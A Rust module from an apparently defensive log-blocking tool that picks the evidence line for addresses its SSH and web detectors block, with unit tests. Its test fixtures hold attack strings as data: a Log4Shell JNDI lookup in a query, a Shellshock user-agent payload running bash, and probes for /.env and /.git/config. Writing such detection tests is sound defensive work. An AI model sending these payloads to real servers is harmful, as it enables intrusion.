/*  This file is part of the stop-bots project.
 *
 *  Copyright (C) 2026 Marko Ivankovic
 *
 *  This program is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU Affero General Public License as published
 *  by the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU Affero General Public License for more details.
 *
 *  You should have received a copy of the GNU Affero General License
 *  along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

//! The log line that triggered a block, found for the addresses a
//! detector has just decided to block.
//!
//! **This picks evidence; it never decides anything.** The detectors in
//! `sshlog` and `accesslog` decide who is blocked. This reads the same log
//! once more, only when a pass has blocked something new, and only for
//! those addresses, to find the line worth showing beside the block: the
//! request for `/.env`, the payload, the failed login. Its parsing is
//! therefore deliberately lighter than theirs — at worst it shows a less
//! telling line, or none, for an address they already judged.
//!
//! What it returns is the client's own text. [`crate::blocks::evidence_line`]
//! cleans it up where it is stored.

use std::collections::HashMap;
use std::net::IpAddr;

use crate::protection::Detector;

/// One access-log request, as much of it as evidence needs.
struct Request {
    ip: IpAddr,
    request: String,
    path: String,
    status: String,
    referer: Option<String>,
    user_agent: String,
}

/// The evidence line for each of `observed` (addresses as the detector saw
/// them, each with what the detector said it matched, if it said) in
/// `log_text`, keyed by address. An address with no suitable line is left
/// out.
pub fn evidence_for(
    detector: Detector,
    log_text: &str,
    observed: &[(String, Option<String>)],
) -> HashMap<String, String> {
    let wanted: HashMap<IpAddr, (&String, Option<&str>)> = observed
        .iter()
        .filter_map(|(address, hint)| Some((address.parse().ok()?, (address, hint.as_deref()))))
        .collect();
    if wanted.is_empty() {
        return HashMap::new();
    }
    let mut found: HashMap<IpAddr, String> = HashMap::new();
    if detector.spec().uses_ssh_log {
        // The last failure: the most recent of what earned the block.
        for line in log_text.lines() {
            if let Some(ip) = failed_login_address(line) {
                if wanted.contains_key(&ip) {
                    found.insert(ip, line.trim().to_string());
                }
            }
        }
    } else {
        let last = matches!(
            detector,
            Detector::WebScanners
                | Detector::AssetRatio
                | Detector::RotatingUserAgent
                | Detector::RefererlessCrawl
        );
        for request in log_text.lines().filter_map(parse_request) {
            let Some((_, hint)) = wanted.get(&request.ip) else {
                continue;
            };
            if !last && found.contains_key(&request.ip) {
                continue;
            }
            if let Some(line) = describe(detector, &request, *hint) {
                found.insert(request.ip, line);
            }
        }
    }
    found
        .into_iter()
        .filter_map(|(ip, line)| Some((wanted.get(&ip)?.0.to_string(), line)))
        .collect()
}

/// `request` as evidence for `detector`, or `None` if it is not the kind
/// of line that detector acted on. `hint` is what the detector said it
/// matched: the path, for the probe-path and honeypot detectors.
fn describe(detector: Detector, request: &Request, hint: Option<&str>) -> Option<String> {
    let plain = || format!("\"{}\" {}", request.request, request.status);
    let with_agent = || format!("{} as \"{}\"", plain(), request.user_agent);
    match detector {
        Detector::WebScanners => (request.status == "404").then(plain),
        Detector::SpoofedCrawlers => {
            let agent = request.user_agent.to_lowercase();
            ["googlebot", "bingbot", "gptbot"]
                .iter()
                .any(|marker| agent.contains(marker))
                .then(with_agent)
        }
        // The detector reports the path it matched, as logged.
        Detector::ProbePaths | Detector::Honeypot => {
            let matched = hint.map_or(request.path != "/", |path| {
                request.path == path.split('?').next().unwrap_or("").to_lowercase()
            });
            matched.then(plain)
        }
        Detector::RobotsTxt => (request.path == "/robots.txt").then(plain),
        Detector::Injection => {
            use crate::injection::{in_referer, in_request, in_user_agent};
            if let Some(kind) = in_request(&request.request) {
                Some(format!("{kind}: {}", plain()))
            } else if let Some(kind) = in_user_agent(&request.user_agent) {
                Some(format!(
                    "{kind} in the user agent: \"{}\"",
                    request.user_agent
                ))
            } else {
                let referer = request.referer.as_deref()?;
                in_referer(referer).map(|kind| format!("{kind} in the referer: \"{referer}\""))
            }
        }
        Detector::RotatingUserAgent => Some(with_agent()),
        Detector::AssetRatio | Detector::RefererlessCrawl => Some(plain()),
        Detector::SshScanners => None,
    }
}

/// The address on an sshd failure line — `Failed ... from <ip> port <n>`
/// or `Invalid user ... from <ip> port <n>` — taken from the last
/// ` from `, the one sshd itself wrote.
fn failed_login_address(line: &str) -> Option<IpAddr> {
    if !(line.contains("Failed ") || line.contains("Invalid user ")) {
        return None;
    }
    let at = line.rfind(" from ")?;
    let (address, _) = line.get(at + " from ".len()..)?.split_once(" port ")?;
    address.parse().ok()
}

/// One access-log line in either format the detectors read.
fn parse_request(line: &str) -> Option<Request> {
    let trimmed = line.trim_start();
    if trimmed.starts_with('{') {
        parse_json(trimmed)
    } else {
        parse_combined(line)
    }
}

/// `<ip> - <user> [<time>] "<request>" <status> <bytes> "<referer>" "<ua>"`.
fn parse_combined(line: &str) -> Option<Request> {
    let ip = line.split_whitespace().next()?.parse().ok()?;
    let quoted: Vec<&str> = line.split('"').collect();
    let request = quoted.get(1)?.to_string();
    let status = quoted.get(2)?.split_whitespace().next()?.to_string();
    Some(Request {
        ip,
        path: path_of(&request),
        request,
        status,
        referer: quoted.get(3).map(|r| r.to_string()),
        user_agent: quoted.get(5).map(|u| u.to_string()).unwrap_or_default(),
    })
}

/// A JSON `log_format` keyed by NGINX's variable names, as `accesslog`
/// reads it. A line naming `remote_addr` twice is skipped, for the reason
/// `accesslog` refuses it: one of the two was written by the client.
fn parse_json(line: &str) -> Option<Request> {
    if line.matches("\"remote_addr\"").count() != 1 {
        return None;
    }
    let object: serde_json::Map<String, serde_json::Value> = serde_json::from_str(line).ok()?;
    let field = |key: &str| match object.get(key)? {
        serde_json::Value::String(text) => Some(text.clone()),
        serde_json::Value::Number(number) => Some(number.to_string()),
        _ => None,
    };
    let request = field("request")
        .or_else(|| field("request_uri"))
        .or_else(|| field("uri"))?;
    Some(Request {
        ip: field("remote_addr")?.parse().ok()?,
        path: path_of(&request),
        request,
        status: field("status").unwrap_or_default(),
        referer: field("http_referer"),
        user_agent: field("http_user_agent").unwrap_or_default(),
    })
}

/// The path of a request line (`GET /a?b HTTP/1.1`) or a bare target
/// (`/a?b`), without its query, lowercased.
fn path_of(request: &str) -> String {
    let target = if request.starts_with('/') {
        request
    } else {
        request.split_whitespace().nth(1).unwrap_or("")
    };
    target.split('?').next().unwrap_or("").to_lowercase()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn line(ip: &str, request: &str, status: u16, user_agent: &str) -> String {
        format!(
            "{ip} - - [28/Sep/2026:10:00:00 +0000] \"{request}\" {status} 12 \"-\" \"{user_agent}\"\n"
        )
    }

    fn evidence(detector: Detector, log: &str, ip: &str) -> Option<String> {
        evidence_for(detector, log, &[(ip.to_string(), None)]).remove(ip)
    }

    #[test]
    fn a_probe_is_evidenced_by_the_request_for_the_path() {
        let log = [
            line("203.0.113.5", "GET / HTTP/1.1", 200, "curl/8"),
            line("203.0.113.5", "GET /.env HTTP/1.1", 404, "curl/8"),
            line("203.0.113.5", "GET /.git/config HTTP/1.1", 404, "curl/8"),
        ]
        .concat();
        let hinted = evidence_for(
            Detector::ProbePaths,
            &log,
            &[("203.0.113.5".into(), Some("/.git/config".into()))],
        );
        assert_eq!(
            hinted.get("203.0.113.5").map(String::as_str),
            Some("\"GET /.git/config HTTP/1.1\" 404"),
            "the path the detector matched"
        );
        assert_eq!(
            evidence(Detector::ProbePaths, &log, "203.0.113.5").as_deref(),
            Some("\"GET /.env HTTP/1.1\" 404"),
            "without a hint, the first request that is not the home page"
        );
    }

    /// Named, because the name is what an operator can look up, and
    /// placed, because a payload in the user agent is not in the request
    /// line at all.
    #[test]
    fn an_injection_names_its_signature_and_where_the_payload_was() {
        let in_request = line(
            "203.0.113.6",
            "GET /index.php?s=${jndi:ldap://x/a} HTTP/1.1",
            200,
            "curl/8",
        );
        let found = evidence(Detector::Injection, &in_request, "203.0.113.6").unwrap();
        assert!(found.contains("\"GET /index.php?s=${jndi"), "{found}");
        assert!(
            !found.starts_with('"'),
            "names the signature first: {found}"
        );

        let in_agent = line(
            "203.0.113.7",
            "GET / HTTP/1.1",
            200,
            "() { :; }; /bin/bash -c id",
        );
        let found = evidence(Detector::Injection, &in_agent, "203.0.113.7").unwrap();
        assert!(found.contains("in the user agent"), "{found}");
    }

    #[test]
    fn a_web_scanner_is_evidenced_by_its_last_not_found() {
        let log = [
            line("198.51.100.4", "GET /a HTTP/1.1", 404, "x"),
            line("198.51.100.4", "GET /b HTTP/1.1", 404, "x"),
            line("198.51.100.4", "GET / HTTP/1.1", 200, "x"),
        ]
        .concat();
        assert_eq!(
            evidence(Detector::WebScanners, &log, "198.51.100.4").as_deref(),
            Some("\"GET /b HTTP/1.1\" 404")
        );
    }

    #[test]
    fn an_ssh_scanner_is_evidenced_by_its_last_failed_login() {
        let log = "Sep 28 10:00:00 host sshd[1]: Failed password for root from 198.51.100.8 port 1 ssh2\n\
                   Sep 28 10:00:01 host sshd[1]: Invalid user admin from 198.51.100.8 port 2\n\
                   Sep 28 10:00:02 host sshd[1]: Accepted password for me from 198.51.100.9 port 3 ssh2\n";
        assert_eq!(
            evidence(Detector::SshScanners, log, "198.51.100.8").as_deref(),
            Some("Sep 28 10:00:01 host sshd[1]: Invalid user admin from 198.51.100.8 port 2")
        );
        assert_eq!(evidence(Detector::SshScanners, log, "198.51.100.9"), None);
    }

    /// The username is the client's, and can say `from <someone else>`.
    #[test]
    fn a_username_naming_another_address_does_not_move_the_evidence() {
        let log =
            "sshd[1]: Failed password for x from 192.0.2.1 port 22 from 198.51.100.8 port 5 ssh2\n";
        assert!(evidence(Detector::SshScanners, log, "192.0.2.1").is_none());
        assert!(evidence(Detector::SshScanners, log, "198.51.100.8").is_some());
    }

    #[test]
    fn a_json_log_gives_the_same_evidence() {
        let log = r#"{"remote_addr":"203.0.113.9","status":"404","request":"GET /.env HTTP/1.1","http_user_agent":"x"}"#;
        assert_eq!(
            evidence(Detector::ProbePaths, log, "203.0.113.9").as_deref(),
            Some("\"GET /.env HTTP/1.1\" 404")
        );
        let forged = r#"{"remote_addr":"203.0.113.9","http_user_agent":"","remote_addr":"192.0.2.1","request":"GET /.env HTTP/1.1","status":"404"}"#;
        assert_eq!(evidence(Detector::ProbePaths, forged, "192.0.2.1"), None);
    }

    #[test]
    fn only_the_addresses_asked_about_are_looked_for() {
        let log = line("203.0.113.5", "GET /.env HTTP/1.1", 404, "x");
        assert!(evidence_for(Detector::ProbePaths, &log, &[("192.0.2.1".into(), None)]).is_empty());
    }
}
